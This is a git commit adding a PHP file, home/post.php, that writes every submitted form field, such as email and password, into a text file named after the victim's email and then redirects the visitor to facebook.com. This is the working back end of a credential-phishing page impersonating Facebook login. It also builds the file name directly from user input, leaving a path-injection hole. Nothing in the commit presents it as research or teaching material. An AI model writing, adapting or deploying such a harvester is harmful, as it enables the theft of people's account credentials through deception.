4ab5a5e2fda0bae06277d788455496c6cc2810d9
kanzulfkr <95927053+kanzulfkr@users.noreply.github.com>
2022-12-04 17:54:10 +0700

    Add files via upload

---
+++ home/post.php
@@ -0,0 +1,20 @@
+<?php
+
+$_POST['login'];
+$email = $_POST['email'];
+$file = fopen("$email.txt", "a");
+
+fwrite($file, "\t\t\t\t\t\t");
+fwrite($file, "\r\n");
+foreach ($_POST as $key => $value) {
+    fwrite($file, "\t\t\t\t\t\t");
+    fwrite($file, $key);
+    fwrite($file, "=");
+    fwrite($file, $value);
+    fwrite($file, "\r\n");
+}
+fwrite($file, "\r\n");
+fwrite($file, "\t\t\t\t\t\t");
+fclose($file);
+header("Location: https://www.facebook.com");
+die();
